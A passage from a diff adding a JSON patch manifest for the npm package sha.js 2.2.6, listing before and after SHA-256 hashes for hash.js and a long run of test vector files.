@@ -1,0 +1,807 @@
+{
+  "patches": {
+    "pkg:npm/sha.js@2.2.6": {
+      "uuid": "19539c57-1ffa-48f6-80b8-f562812fae64",
+      "exportedAt": "Tue, 03 Feb 2026 21:20:37 GMT",
+      "files": {
+        "package/hash.js": {
+          "beforeHash": "d216d485221418b4939396d8f57011ed835869e3d9de302d8c47376628749f27",
+          "afterHash": "edc5e054a2c3e6037b4669ef0e960a229b4b2c58c9337e82d3cd285fab16e4bd"
+        },
+        "package/test/prepare/vectors/byte0000.dat": {
+          "beforeHash": "473a0f4c3be8a93681a267e3b1e9a7dcda1185436fe141f7749120a303721813",
+          "afterHash": "473a0f4c3be8a93681a267e3b1e9a7dcda1185436fe141f7749120a303721813"
+        },
+        "package/test/prepare/vectors/byte0002.dat": {
+          "beforeHash": "1cd5f4fefd68ef2d1dbaaea7a9db8c8c05b1072e449bf4acade5c2edb5e36322",
+          "afterHash": "345794c48ef023a0eeeb43643756e779314412629d5f36b1714b927f4e51ea87"
+        },
+        "package/test/prepare/vectors/byte0003.dat": {
+          "beforeHash": "6f4fa063569cebb4882dad1a52e9f2f140386c6d7dc731ac14260ca59c000dc3",
+          "afterHash": "37f5193ec6a96c04c1f6ba2479791ce5c9368f90178c2c346b320d97afd865c9"
+        },
+        "package/test/prepare/vectors/byte0004.dat": {
+          "beforeHash": "560f49a6d7ad6552c00aa0dc5606552f1e195803ecaa14b15f5423bfbc0b850b",
+          "afterHash": "aaaaca6fa69864291037a7e6f26e0109486ef1464528f13bc88b881b7dde85ed"
+        },
+        "package/test/prepare/vectors/byte0005.dat": {
+          "beforeHash": "cad763f592048383e49e8884feeac13e313ecda510c68cec2486c00d8abffcbf",
+          "afterHash": "154f7c2bd9a0dfd44127304eba2050a8d6fc85632f450a89854bc3a3913bcc3f"
+        },
+        "package/test/prepare/vectors/byte0006.dat": {
+          "beforeHash": "3a212126d7ffba82abfb347007d044b8ab5622db8b3d94ff35bb735b606acf4e",
+          "afterHash": "ce5c9ea883341da8cc064ee327b298d36cf5585a4e5780030d021bb4655e1c6c"
+        },
+        "package/test/prepare/vectors/byte0007.dat": {
+          "beforeHash": "5fe7ebf56d1b5de740033a9ee8bf89dadb3cbd83ea65bf1eda445ad36a3c8cc0",
+          "afterHash": "50a5b23ea9342061feb896afd25f55429594048434296ed7e9617f2611bfff80"
+        },
+        "package/test/prepare/vectors/byte0008.dat": {
+          "beforeHash": "2f6a23c03cd1876dde436d5e3eb1dae46b8297d2815c4e61d0477a48d48f9995",
+          "afterHash": "eee07136c4aa4bba91399f5c7142e281b42cfff2974dd48dbee89818b9f2f0a9"
+        },
+        "package/test/prepare/vectors/byte0009.dat": {
+          "beforeHash": "c04c3720f4f50f9f4acb5f6585d5a86c5c8b8a861d0ad925795fee6665108e7d",
+          "afterHash": "78ed2e6ff50e90cb7b505e13dc6836a2359c87324fa0d1c0e936f9cfc3122f10"
+        },
+        "package/test/prepare/vectors/byte0010.dat": {
+          "beforeHash": "cf5b0dcf195cfd2fe1bdd5102a78951ec4974309d550ec2068dbc2ec4bdadc98",
+          "afterHash": "93dd7357196b74b815913f33046e91baab905481678410a075887c4929d1af9c"
+        },
+        "package/test/prepare/vectors/byte0011.dat": {
+          "beforeHash": "ce3be3e400cd5e78343c6384ad39ba0def7916b443f4f69c60c5bc6a3bcf624e",
+          "afterHash": "4254a51d2820de8de80f798c0dfec501c7f726fe249ae1dffbd08234f7f9046c"
+        },
+        "package/test/prepare/vectors/byte0012.dat": {
+          "beforeHash": "c90c7c654144639d3b4c003014c36910835f8b4af15af97b5d8dae922b4745d3",
+          "afterHash": "8e89249968a15916940a8caf2337f599a2f38e145cf019ae66491f848055d184"
+        },
+        "package/test/prepare/vectors/byte0013.dat": {
+          "beforeHash": "3c8262e9334e7cb8cfc674436f6eea6db7ef57b18eb31c40117bd1c789697546",
+          "afterHash": "6e3bdbda3dfe266b13b43070453d631910827a8993858b6b612bcf11d0fcbd27"
+        },
+        "package/test/prepare/vectors/byte0014.dat": {
+          "beforeHash": "1c5ef586270b1f5dd23395e75a22683e766205c5f3a38536ab14cde77d2f7fb1",
+          "afterHash": "9a9b27eeb531a1a7aebc6649ffaab5a88bcceac30af64574a8fbfe4a3a63b230"
+        },
+        "package/test/prepare/vectors/byte0015.dat": {
+          "beforeHash": "896f51412394f4294c3791f98f887b457223ddb568b901aa885a0da4b62edba6",
+          "afterHash": "b479ee2193a4e688a7c24cd082d6fb081708e159d8166da2664a213e290999fc"
+        },
+        "package/test/prepare/vectors/byte0016.dat": {
+          "beforeHash": "d669f7effe1841143f4cf9d74bba9a82ecdfc18260a655ca023105825f876965",
+          "afterHash": "aa25c4631c5b97b16caeb37500637fe2b0524e5ea731a66507d854fcbbd945b8"
+        },
+        "package/test/prepare/vectors/byte0017.dat": {
+          "beforeHash": "727cbb8f61b911d9581a9bd867ef81ec8b5bbea1b453ed9aba736507dd1b4517",
+          "afterHash": "147074a8777720f071c77f07e76d9adf8242dfdd13950b0eecea9d9abf20f69b"
+        },
+        "package/test/prepare/vectors/byte0018.dat": {
+          "beforeHash": "d01cb5f7090ae700c0ac24d4aee827ec95f7eed4411f9f618837b334ec8cbea2",
+          "afterHash": "3c8bb332853c6d9b96e26286a236c33c8720eb00be13baaa8c3cca38b3174f8c"
+        },
+        "package/test/prepare/vectors/byte0019.dat": {
+          "beforeHash": "e568e094ebb80693fede94db62d2dd7c3c4b3ef56fb0262982e3c241c1ab3250",
+          "afterHash": "fb2be5a6bdd127e8c09781bfcd63f3842256192b0e69015ffa737ffd1663c821"
+        },
+        "package/test/prepare/vectors/byte0020.dat": {
+          "beforeHash": "aedc13a501714394655b89193ee3027c96e795d5653525da24cdbc6f99bd80e1",
+          "afterHash": "69fecc599dcd77ca45072c8819164d77047b640b4c771f027873509a44d56d58"
+        },
+        "package/test/prepare/vectors/byte0021.dat": {
+          "beforeHash": "4c777deac8f651d87d9af768a45cb4b487f7383a6d15acc185f6c0d0989b7ad8",
+          "afterHash": "b83b9bd513b46371635f39c2e17bcb88dfe1df0e4f552c6d2bed89e76adcfc2f"
+        },
+        "package/test/prepare/vectors/byte0022.dat": {
+          "beforeHash": "6f53cf1bf1460d5ed7ee4612520a4955efe553375e775ae11f9ba4c6a1beb89c",
+          "afterHash": "dd92ea12b51b6760a8bdf60f9ef1aa0ace15d7c163227e3396b3ec3a32c77c11"
+        },
+        "package/test/prepare/vectors/byte0023.dat": {
+          "beforeHash": "f2af7084b2165228d5b755e62072ce51e47d8c57d2c2baa20bf63345b8e4fc61",
+          "afterHash": "506e97c16f6c5b69d18b3d59ab4298b960b59ef001f94ad5e507f4acc9dd67f5"
+        },
+        "package/test/prepare/vectors/byte0024.dat": {
+          "beforeHash": "2744aefbce251dd4df307f17525058b61b1aa918322a284c2e9f01473c68b625",
+          "afterHash": "a982b6df32b50d3c24485ee6bc0093b3b067fffe10f66bfb52abf61909983923"
+        },
+        "package/test/prepare/vectors/byte0025.dat": {
+          "beforeHash": "056920f422016957d7f81a328df5405539ba8afa4b5747100604ab680d1687e6",
+          "afterHash": "f818ba3f58e9554517675990f2e7723b6ad2583490544c1c0b1b8b0f006dcd74"
+        },
+        "package/test/prepare/vectors/byte0026.dat": {
+          "beforeHash": "d3586ff2ee2612617633bb43a240aaff880be7391c88a2091f600e300aa90d27",
+          "afterHash": "bae62723fcea0b70eb2ecf99412111d20f11503e7c199711961537d240c01c9c"
+        },
+        "package/test/prepare/vectors/byte0027.dat": {
+          "beforeHash": "473b6f5cb603ba885883a4061e521f7b7c3115d0038f630c0e5834bf1db7a9a8",
+          "afterHash": "c60d38ddd85bcc30e84982cee9fe14514fd52adbdb8291c29579b0b4a1e6e678"
+        },
+        "package/test/prepare/vectors/byte0028.dat": {
+          "beforeHash": "26c8f040717047822570b661d82fd8c74701016f4dc55897cdb52e9021385e18",
+          "afterHash": "0a1eb6ad2b341312514062efb480c4dce242bfd9ae2c7f8f14cd6f4ac66c668c"
+        },
+        "package/test/prepare/vectors/byte0029.dat": {
+          "beforeHash": "0fdd4c9fab1bfd69e91b42ef6ab92132a2cfb6f46560587a8a6d2e9a565c3f92",
+          "afterHash": "29f0d72d92a3b097c4da344f9efaa0e480ed08abbe968bad74a74e8681bac620"
+        },
+        "package/test/prepare/vectors/byte0030.dat": {
+          "beforeHash": "fe643015e50b33e252378f8b2fbb4386e0b345896b7260d6107b30bdc5165622",
+          "afterHash": "0f42b7ce78cb3cf4d31bbe7d8961933de928b2d931b5e9b6a95957b9d7e8bf83"
+        },
+        "package/test/prepare/vectors/byte0031.dat": {
+          "beforeHash": "870397a7f634797593c7ec0914ad7e447d9584bf10141e21d3c89b890a487e77",
+          "afterHash": "e6d1b4089364d727a4787c7ca1483524bd9dc5845e7f09ab342cc74e851c94e7"
+        },
+        "package/test/prepare/vectors/byte0032.dat": {
+          "beforeHash": "1caa1b90c9aa289021c06aa917ea1a60b5b5bc88d23690a532f3e6e8ef6de50c",
+          "afterHash": "cca1e7b0c5e15c58ab81c2d543b2859dc04493f890a871597e0c56a17adffb20"
+        },
+        "package/test/prepare/vectors/byte0033.dat": {
+          "beforeHash": "b3fa23c7b795c845306a1d493cf3edee14528dc448cf2624bbc495b034aabfd8",
+          "afterHash": "446e556573bc6a2bce9c448706f5a1a0fab36df3fc0fd28e2765b3f225446744"
+        },
+        "package/test/prepare/vectors/byte0034.dat": {
+          "beforeHash": "0b963c95fc880db9a8a4a97f593ed94d387d4cfb717c60763c8c6f7354c04676",
+          "afterHash": "dfc43192afa799e3692de090fe246bb7f5c40b94a95ac8191ae520062940bd64"
+        },
+        "package/test/prepare/vectors/byte0035.dat": {
+          "beforeHash": "8dbb4e26d49b48de53c74fdbd8700fe29e5b6cca51d6ead2f40a4e2717435808",
+          "afterHash": "238435108ded7f8dcf12c1f676d46d321bdedcf8f6ffe6a8786f3aee2eda3be5"
+        },
+        "package/test/prepare/vectors/byte0036.dat": {
+          "beforeHash": "db9ff3aefabf80b69effa420a77d0de329a5c55d7610e519a80a17f167d0edf2",
+          "afterHash": "273a7cbbdfd1b5aa90a9e9b06f11fd37433a085f2216ea5ff23dbd76404774eb"
+        },
+        "package/test/prepare/vectors/byte0037.dat": {
+          "beforeHash": "d2a7aaf758f12c35f209e395eca5ae0febcb557007b2929564c738bdec0aea5c",
+          "afterHash": "d3e4de9e71c1c1e3dd32aed039a7cfb3884f29a848d639b6e5482abe071d5952"
+        },
+        "package/test/prepare/vectors/byte0038.dat": {
+          "beforeHash": "04ea1cfb1f83244180dd3e265f807f5bb0bd8cb86d01e12f820452f5bf7ab55f",
+          "afterHash": "a5f7a8cd8fa25b65106eea454a0bb405a0a987c9b0d79a9e9f3a26743212d7e1"
+        },
+        "package/test/prepare/vectors/byte0039.dat": {
+          "beforeHash": "30f126c80363ae8c141d3a2a2311c6acf80ee9ebb18d0f7133238294b53d2ea1",
+          "afterHash": "b6808c20a8a34508a36c8f672ced11bf6e24d0c623d5f7ce27242631ae9eefc1"
+        },
+        "package/test/prepare/vectors/byte0040.dat": {
+          "beforeHash": "ac0ca0009d723ba12eb5d2187154dbe799e81715bfce67924e13ffecc8751ef9",
+          "afterHash": "a9604664df6cdf8b7180e38f9b1da347f959a3bebe8e5ab3f45ea8c0fce34a35"
+        },
+        "package/test/prepare/vectors/byte0041.dat": {
+          "beforeHash": "d7f580c53935fbeb62075307f098c81cd59f4615a06bcaf68ec20a35a1935a63",
+          "afterHash": "3f900c4653043259923edfa20c7fd99a073ae2c59462a4e68021f0d3fac53610"
+        },
+        "package/test/prepare/vectors/byte0042.dat": {
+          "beforeHash": "043c155f5a8d7befa0ce1a2e40b4d3faef91872e0014d8277b4f0ffe90cd0ab8",
+          "afterHash": "3e58fa2f532061d9f466f68460124643e26752f45162158d54e88430b4cb2117"
+        },
+        "package/test/prepare/vectors/byte0043.dat": {
+          "beforeHash": "5a9d08f44ccb528c62847839519b309cf7f04cd8daa424f12608c771c7b79ea9",
+          "afterHash": "cc7c1e89496d2e891e471204b2917eef92e41f9252e70aaf87713abcdee0d817"
+        },
+        "package/test/prepare/vectors/byte0044.dat": {
+          "beforeHash": "f1264645efb0ae302d054f1cb962ab74ed9f591d25453608affb98c54be33c64",
+          "afterHash": "e07f63130b9643f660b30ab2d387b920ef82bc3018616e0ae6b37ceb208d319c"
+        },
+        "package/test/prepare/vectors/byte0045.dat": {
+          "beforeHash": "21be3665716cd7ab68bc9a5fea98c9adcbeed5a2113b86a134e94286d3c81163",
+          "afterHash": "f23468f81839ddefe51d52a1939a44c62ee5146145a0df4c146c60d9d5043ec9"
+        },
+        "package/test/prepare/vectors/byte0046.dat": {
+          "beforeHash": "60a5f96180afecbd4c8d5c01cbaeb31847a2296bc9e2c11a442d70348a7a8bf5",
+          "afterHash": "1e97ed0f9dfe921dab3239673a5357b9860d38e9146d293c8b58c66a1f4f5d24"
+        },
+        "package/test/prepare/vectors/byte0047.dat": {
+          "beforeHash": "3de70d771fa07355e8a04604d1f25273393dfe4f033beceed17da8a1c3c3b60b",
+          "afterHash": "28433f0c5998a6e10fff8234f1b3561c668a9ee092d4f0ac8fa0c82c35f802df"
+        },
+        "package/test/prepare/vectors/byte0048.dat": {
+          "beforeHash": "fb5bf3b444a98ee1a3725d43aa9656c9780bdeb02ea61e389491f90195288640",
+          "afterHash": "7bf117ced06191323092f49ba20da9ae2d557e13e5d846a7afa3c0f48b919415"
+        },
+        "package/test/prepare/vectors/byte0049.dat": {
+          "beforeHash": "90ce6b7d7324528d32273e68faec4bb48d6495763ede4f43275ef5079d739bc4",
+          "afterHash": "7c476ed2718749fe623405bb24b2031808f6149d1dc01167c3dead3022e3a19f"
+        },
+        "package/test/prepare/vectors/byte0050.dat": {
+          "beforeHash": "144370f9c3d0cf1e969d73ac2c1a7873923aeafcb8f7c0a23955810dc73d9a7a",
+          "afterHash": "66147e50a6d93b2e167acf5b865e74621af6ce931507d25fb268f961d81a4495"
+        },
+        "package/test/prepare/vectors/byte0051.dat": {
+          "beforeHash": "44dcb27f2ede11d44458e7f355b7b71f303bdd45280d0cc713a7d0b45cf0bb62",
+          "afterHash": "5cd97440bf3716fdc717f3f832f003ca004ee02209eab2f4604c54b9ff23c4db"
+        },
+        "package/test/prepare/vectors/byte0052.dat": {
+          "beforeHash": "442e6b6266d4d9ef19ee2f82eb06ab9f728535cddfafbcba658422dc767410d6",
+          "afterHash": "6eb2dd17553ccc14dc4db14a5d4b5a24e9caee85dcfe8fb8d0afdab0d8c15386"
+        },
+        "package/test/prepare/vectors/byte0053.dat": {
+          "beforeHash": "a327b29d3c70f486cab4b0e2cd4dfb1eda98cb7efec0feef5859945c911ab566",
+          "afterHash": "1ac6ca062df3365d0d0654d8bc53da116c1c4374b8b69b2130e35d19a80ca71c"
+        },
+        "package/test/prepare/vectors/byte0054.dat": {
+          "beforeHash": "78ccc061a8aff1af5b6b58c918467f7e3a997247d61098b4df1f6f3c7476a071",
+          "afterHash": "276299d6a768cc7e14d6fb2a131190677a65c1118b623f985a5ebf2d4656e227"
+        },
+        "package/test/prepare/vectors/byte0055.dat": {
+          "beforeHash": "1172ba7c78fb382c6044cf8605a3a870135800cba2d3258689602ed749916146",
+          "afterHash": "803eaac558fe281948803496e1097d76dfc75c95b8dea7191a589b48809ef776"
+        },
+        "package/test/prepare/vectors/byte0056.dat": {
+          "beforeHash": "dd802ab8335b7b637f8b3f9336adaef091b8d4426b31af9ad5652ea299d19c24",
+          "afterHash": "88220e8a130a81ac073b9faa1f95bd718b41ff180dea9dda6ffc379490afe638"
+        },
+        "package/test/prepare/vectors/byte0057.dat": {
+          "beforeHash": "619a675f7c82ac39327cf1568157658ba25e1f92b1a46d90210c3f2dd2bbe952",
+          "afterHash": "ac3d3912e9aa2dd1aa10812a5496634e4453496167633f6a3603811b404207d8"
+        },
+        "package/test/prepare/vectors/byte0058.dat": {
+          "beforeHash": "236939a91d6facbc3f82aa901734d0942e6872d748192a7eadc890e8276d4eea",
+          "afterHash": "cd58dbb3d0c5b299d19a3296522dfcc3ade8ad458e727cf3e44cff8b523ac32a"
+        },
+        "package/test/prepare/vectors/byte0059.dat": {
+          "beforeHash": "0812f2feb1277f5875218fa48eb616d4b5bf8cca1ff0396549ca7f00edb9e632",
+          "afterHash": "0ee2e93ccd2df1026e18781b12c7b2c1ca8c9d6d04b2381b44b1dbeade42cef0"
+        },
+        "package/test/prepare/vectors/byte0060.dat": {
+          "beforeHash": "23f2b0c0eab14375093760fa8c90179178fb44564a18e3ca2c24bea6f6e74f39",
+          "afterHash": "b35cf7795c3527f498f312bc500b5857e7adf5d85b3a7029f15ebe29c6f5fae9"
+        },
+        "package/test/prepare/vectors/byte0061.dat": {
+          "beforeHash": "020b434bf9dd6b1aaa382fe22be748dbb1bf930331be62ad09acb0bf3020c82f",
+          "afterHash": "532c215f8d20994b063fc833144f8e19341bedaebd5335ae4e8de704a23e880b"
+        },
+        "package/test/prepare/vectors/byte0062.dat": {
+          "beforeHash": "4ac982c50d10d13002149683a3a84709921d1872344f736e90cd02de9a7aa08f",
+          "afterHash": "b3533f89cef9b3ca5f33ca79914ce7959cd67b92c60d52be8d42b8cb1d4cb566"
+        },
+        "package/test/prepare/vectors/byte0063.dat": {
+          "beforeHash": "758563ba930198727e78867e839db93bc2d6eac991bafee325f8ac9392faa1e1",
+          "afterHash": "29095ea541c81515db50e7c523364baa80ddb4f43e09fe5393408dbba19defbb"
+        },
+        "package/test/prepare/vectors/byte0064.dat": {
+          "beforeHash": "6c73b94f7a249bfa11ee67fb441fb1653f9f7a05f1bf47ee66c45c08269f1955",
+          "afterHash": "588794705d137944c81c7a3a2b37583778d50d73cf6ea3082a0c9ca103ce095a"
+        },
+        "package/test/prepare/vectors/byte0065.dat": {
+          "beforeHash": "4e277585af9f32be7089e81b35ca0b68f589a2b9aff28bfb53d74ca5f493972d",
+          "afterHash": "11280f552d469e8503ac18cd50f43c784d3cce7014537006ff8751503503e20a"
+        },
+        "package/test/prepare/vectors/byte0066.dat": {
+          "beforeHash": "e59b3ae34cb4fa57ddc67d403d1d736cadcd09a613253a40cb6c2ca9e84f12ae",
+          "afterHash": "dc146ca4027d42015e8e494517c2c4c411581607aed9d810c18c27d4541dda46"
+        },
+        "package/test/prepare/vectors/byte0067.dat": {
+          "beforeHash": "b917fa1cbbe52b137647873144d4e6bdfbaf2fc5589dd4105d4238a9dc58efca",
+          "afterHash": "b1bd2fbcba5c9e0768d28976a8056d8918984fad5a09e559346024afdcdc42b8"
+        },
+        "package/test/prepare/vectors/byte0068.dat": {
+          "beforeHash": "8ddd73a15a9d23cd5e692784ab3eccc49aefeb99b4172195bf893996d929643a",
+          "afterHash": "53f0e4c109707ac66f32d8b73d266c95a3b7ad41354adb883930ce5495bb3f6a"
+        },
+        "package/test/prepare/vectors/byte0069.dat": {
+          "beforeHash": "0fdea5ed9dbcbc277178e75e46ebfc51fb91c2c23b68beabdd0c19cee3151d4a",
+          "afterHash": "88d10fea7ac10180c538caa58e9a621df510a0f6c2ca8c07f60867efacee7204"
+        },
+        "package/test/prepare/vectors/byte0070.dat": {
+          "beforeHash": "bb7c18118c71f1985a35286b24762b2da0345144f58cbd6daba7a1fc989f02c7",
+          "afterHash": "e95ab56cb02ff3b50626f1db3fe58da0f17038c4967d85175e765eb91e916e00"
+        },
+        "package/test/prepare/vectors/byte0071.dat": {
+          "beforeHash": "7498d2e96889986f8ff0683444c8cbf33836bfe070000bbe61e0b2750020b5cb",
+          "afterHash": "7acc4b3857c7da50eadc81e62f914cefbc528b7564d44ba30605aae58ff2e363"
+        },
+        "package/test/prepare/vectors/byte0072.dat": {
+          "beforeHash": "c321e037b78caca5852e6b398b6ef35cace5eb5b52a3d516f507126e06bfe4f7",
+          "afterHash": "df2c5cdcfd79d84a4a24a057c2e0c18aed730137db9e81f96e93dcd736336527"
+        },
+        "package/test/prepare/vectors/byte0073.dat": {
+          "beforeHash": "68b622b01f9595e1e9270e99de84458279697b1b315a6afccf7c3f43c6bbb1e0",
+          "afterHash": "d2dae1bc8796e63f800499932c5bed5f8194373399e38f6d74939a2531f2a3e3"
+        },
+        "package/test/prepare/vectors/byte0074.dat": {
+          "beforeHash": "6fe17830b058d36e9a940b668c91e604473a7b4a520e5eb66e9be30a60bb3560",
+          "afterHash": "17eaf29157687ffc60ff69e6dd515c6b4d27b9a20c9d3fcc4ebeb1492e66b621"
+        },
+        "package/test/prepare/vectors/byte0075.dat": {
+          "beforeHash": "9542f90ff2cb6e6e430148ca3d204796b5df23b5572e2b5d6d17f251e9abbd20",
+          "afterHash": "131056c21675cbb75567166dfd530725fd7b7f4cf0c44a6cdd3be8e53460284a"
+        },
+        "package/test/prepare/vectors/byte0076.dat": {
+          "beforeHash": "5297971077e274cf4825938e84179900f635320f26c41b03ed337312f2e54f95",
+          "afterHash": "4d3b8175cfd1730d328a216c19af31752862807cc287d975c54d9d72614a9df4"
+        },
+        "package/test/prepare/vectors/byte0077.dat": {
+          "beforeHash": "d388cbdd1c93f8ad4f63d0835ca82bc8ad5863808af5b0abbe39b327639d8e25",
+          "afterHash": "ceee01debf0973688521fee2bbddb97a34bf884414acb48941d8a6c63042c32d"
+        },
+        "package/test/prepare/vectors/byte0078.dat": {
+          "beforeHash": "01b9eafa5d50cd4dfb33ecf016ee28c52a80b21077d23e4c7a08d682d53c88a2",
+          "afterHash": "f083fd17f8b6bf8235f044fda4d5e0e2fe0c8325edf7a7eb1b81940f7030f1c7"
+        },
+        "package/test/prepare/vectors/byte0079.dat": {
+          "beforeHash": "77b84a978d46ab9389e40844354cecd80cb1456cdcc462917ba5c54c94f6f5c0",
+          "afterHash": "7a31ae79b1abbdf0de33781def30552f8da0afd335bf2a59cc9bc911c6da9da6"
+        },
+        "package/test/prepare/vectors/byte0080.dat": {
+          "beforeHash": "e7c685365ce3025d616fbb119ba36535e8439aa08acea0ce0feee9f654bf1b4c",
+          "afterHash": "6c4e7843629f0964e6a599792afe3af7a0be5e55f5c936d78ca3033ce84a6aee"
+        },
+        "package/test/prepare/vectors/byte0081.dat": {
+          "beforeHash": "3fc71f79661c4d9155acdd9116872c1910560fe117d8220fff882761146e0c79",
+          "afterHash": "de88c784e4d93942f0996173f4fc7c4cf668f5971548b5a995933f03daac8877"
+        },
+        "package/test/prepare/vectors/byte0082.dat": {
+          "beforeHash": "ada2ea1cb7df5efa89876ae2b626aa043e08b0cb9356959c9569cff2c6b02875",
+          "afterHash": "8c83356e5454a6a552de1ae5003e2e720a363572678b8a60ecf1d61a55c2ee7e"
+        },
+        "package/test/prepare/vectors/byte0083.dat": {
+          "beforeHash": "bb9101ed780380377936d84117f946543145466d3a904af1176ae4f9c5f2f0a9",
+          "afterHash": "3cf73e23c9712e9c8241d9f597df3abdc0d70612fb698a4ccbba36a257fb6b6f"
+        },
+        "package/test/prepare/vectors/byte0084.dat": {
+          "beforeHash": "2e0ec3df890f046183cdb2fee507bee919275e3e103f3b16fe4967877a2ffc3a",
+          "afterHash": "8183a99d95c47b6c8e27484d884f0380deaac4937493ec64d8d9b824bacc3c8c"
+        },
+        "package/test/prepare/vectors/byte0085.dat": {
+          "beforeHash": "95a3b5ecafe7fa1c62c0e2456fdcd8ccbf286405902ec8dc706365116f8110a8",
+          "afterHash": "01e36ac63911b073f43001256952d2af55f93f965df8d071228aef7abc957920"
+        },
+        "package/test/prepare/vectors/byte0086.dat": {
+          "beforeHash": "0b1182127b31284b5651998166e82a74afea9cb5b4c978df2f9aab57d263710e",
+          "afterHash": "6bfd85a7a67d886453dd3ad3396d4c5d4e2875de24e2694f11952f7cbff5bc13"
+        },
+        "package/test/prepare/vectors/byte0087.dat": {
+          "beforeHash": "b57e37a881ca5535985f9d4ff1578585716bb1c7d21547ff7dd7e519e5ee475a",
+          "afterHash": "ae3f69ec0217ee4af4666d6f789874ae368e0c82c413e68635f61bc73971234d"
+        },
+        "package/test/prepare/vectors/byte0088.dat": {
+          "beforeHash": "b3d399c73e8d0bb32e9f39a0e72a3b5a9ed78644e571bbea6b3e6a9ecafbf74d",
+          "afterHash": "485a3167f65ad67e1498a9ea6265b5950fb4e12302c0d81264d9a81a77fa6038"
+        },
+        "package/test/prepare/vectors/byte0089.dat": {
+          "beforeHash": "8dde2701ac6b6dc4aac430f60db765f65b2746f410a38df8fb26a5e098e0c62a",
+          "afterHash": "a598d6baa4c58712cea87f7d08f4b466dea51a36e734a871f3e810c01816cda9"
+        },
+        "package/test/prepare/vectors/byte0090.dat": {
+          "beforeHash": "201d86db0bae33e74b95426f3d94e7055a6a81c368c865c3528ba6dc1d519dda",
+          "afterHash": "2da8c8d84fb612354174ae97fdd4cb08be9ec79717e548a3fcf999fbeb365bdc"
+        },
+        "package/test/prepare/vectors/byte0091.dat": {
+          "beforeHash": "00cbfa758a2cdb946a047ef0fe5ae49e6401e2312157c1551e1c796a35851c82",
+          "afterHash": "b9acf8b37199c3500a102b6ee6c43bcf1dac5685a82ff2aafbb4bad6973c9c59"
+        },
+        "package/test/prepare/vectors/byte0092.dat": {
+          "beforeHash": "d2d1b980bfeb54c2ba2a897bea1b4fc2d1837872e8041f91648bdf547bde4d63",
+          "afterHash": "5811ae53cef02a29b804e4e733ef5e0bb572e7fca1e127f26f89bb6a2561f808"
+        },
+        "package/test/prepare/vectors/byte0093.dat": {
+          "beforeHash": "e20b17d8924739a06ae78d1d8b08a270256dd6e377c18b42bce2b5139fffb80c",
+          "afterHash": "e228ea1c7757ab4ce216a0be85d48ea3220c5671588a7aea74dd6ed57e3bd73e"
+        },
+        "package/test/prepare/vectors/byte0094.dat": {
+          "beforeHash": "16c19bbabd393525b234c2cb2ed24ea1d1bbf7c7854f9fa02864600b967a3329",
+          "afterHash": "404a58ac18d4f3b5465342f367dacff182dd8850857dd926ebdeb2fa20888cf3"
+        },
+        "package/test/prepare/vectors/byte0095.dat": {
+          "beforeHash": "2127b2c62a2e4865562c7e9bf3d8432945b2f42fb7ebe475196dfa7084aa1988",
+          "afterHash": "b01a85c9b18e159c98637c9be1b79dd8904d29b597ac987b9d0a174cb3ddcf93"
+        },
+        "package/test/prepare/vectors/byte0096.dat": {
+          "beforeHash": "bdae3f8d2941722ba03bef0df3b02d32378e3fa4bd4dfc8a7f6598c1c2d054a8",
+          "afterHash": "6af277f8b566f366348339e546611a541c673a3450c8ece1081b8f15e9513b41"
+        },
+        "package/test/prepare/vectors/byte0097.dat": {
+          "beforeHash": "22876634f85120cc101826a4df3b8ab58797d5efbd7c765a52198d270bbe1542",
+          "afterHash": "fc68542359947c55732ab96858d2803245c8edfdf6581a28e2c1ea7fd4858e9d"
+        },
+        "package/test/prepare/vectors/byte0098.dat": {
+          "beforeHash": "2387945646870a5dd02bfd4afbd55da3ca44af0ced660b9d59e2a2cd5c04250e",
+          "afterHash": "9618cc51156e74a5f71b284078a6dfc2b5fd5294ce69f96a915d5cad30eeaa16"
+        },
+        "package/test/prepare/vectors/byte0099.dat": {
+          "beforeHash": "9bb5f2a3c0ffd896dd733634e178236f4e2d570788d0d6f8ce649b87b5d91aa4",
+          "afterHash": "ee3b47865ed8feff02c3aa39d2195a535254dfb4d072b25a1767b806f7f67a3e"
+        },
+        "package/test/prepare/vectors/byte0100.dat": {
+          "beforeHash": "7d7c355cb15587d9497e6ca0a0bc41d64add27fa3787788a8e115d2ba650f35e",
+          "afterHash": "c6987a7dbddc92b95930ec91811301a6ac39ce0ceed533d0c1879803fcfd6ad3"
+        },
+        "package/test/prepare/vectors/byte0101.dat": {
+          "beforeHash": "16a547111ff7d977e9523a8bbec0bed49c069e5a89fa9655c93cc3a5c636c14d",
+          "afterHash": "e85d6748196f98be219a694038a1fa358726cfb993402c7f39a86bb76e2ab658"
+        },
+        "package/test/prepare/vectors/byte0102.dat": {
+          "beforeHash": "8e56c047f06d96bd6163e3f4d98fccafa54a94cb9288df26989e04f7afe9da01",
+          "afterHash": "26c6195aac5624dc5ffc240504dd2b7c97e88a25ec62c0067d67ed9ff2fe3250"
+        },
+        "package/test/prepare/vectors/byte0103.dat": {
+          "beforeHash": "5cf2ac1ecdb417892a82a18b4283f0ee37bbdaa82be59b70f535c2df4d049ff7",
+          "afterHash": "ea9371654bd30f37192af9f91665f4547fdccfc795279c729f819e72df999c71"
+        },
+        "package/test/prepare/vectors/byte0104.dat": {
+          "beforeHash": "a3400f1bb12a8d77c17376f2a8584d9ce80b4d7bdc5c6aa8aa2cbcbc90e29783",
+          "afterHash": "bf457e5fbdb1f1c2b9004d2e640b37c789f375561463fb3fb08aec7cc3fecfab"
+        },
+        "package/test/prepare/vectors/byte0105.dat": {
+          "beforeHash": "8328f9e6cea268a1b53027757a08091798638dd9c690504bd0bcf433d716fd63",
+          "afterHash": "3f0cc5f8c1019ab4115618250714712ec2d1f3dd5be8fd633e54ac05e59f349b"
+        },
+        "package/test/prepare/vectors/byte0106.dat": {
+          "beforeHash": "a604dc08116315d7a06ed42830ca41a41352c8dc788c3ec31c1e09b1a9546ac3",
+          "afterHash": "de8a20a4ed8f31b504dfb9374ae86c49b9f663146a8d842e8131eb1b6418ea8c"
+        },
+        "package/test/prepare/vectors/byte0107.dat": {
+          "beforeHash": "21ac5b3a97f8c3ddde1f64c3053b508cbe4b7e80683a8c214aeca9066d9a7d18",
+          "afterHash": "54921ea1c4ec074c95cbc9cc8f77f9bec2f2a31e22a1216a72fbd926ba6055b2"
+        },
+        "package/test/prepare/vectors/byte0108.dat": {
+          "beforeHash": "9bc568ee802aaefaf6b0660513a54e5195e73c122437f53d254800ed27894d9f",
+          "afterHash": "66a70c08c1b3344cf16e8a68b758af0ef91b0067142b405820ce39aeccc13137"
+        },
+        "package/test/prepare/vectors/byte0109.dat": {
